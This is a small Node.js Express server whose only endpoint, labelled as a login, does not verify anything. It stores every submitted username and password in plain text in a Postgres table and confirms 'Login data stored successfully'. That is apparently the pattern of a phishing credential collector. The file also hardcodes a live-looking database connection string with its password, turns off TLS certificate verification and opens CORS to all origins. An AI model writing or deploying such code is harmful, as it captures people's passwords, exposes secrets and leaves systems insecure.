const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Database connection
const pool = new Pool({
  connectionString: "postgresql://neondb_owner:dTB2MaVFnpO8@ep-ancient-fire-a5moogd9.us-east-2.aws.neon.tech/neondb?sslmode=require",
  ssl: {
    rejectUnauthorized: false
  }
});

// API endpoint for login
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    // IMPORTANT: In a real application, NEVER store passwords in plain text.
    // Always use a strong hashing algorithm like bcrypt.
    const query = 'INSERT INTO users(username, password) VALUES($1, $2) RETURNING *';
    const values = [username, password];
    
    const result = await pool.query(query, values);
    
    res.status(200).json({ message: 'Login data stored successfully' });
  } catch (error) {
    console.error('Error storing login data:', error);
    res.status(500).json({ message: 'Failed to store login data' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});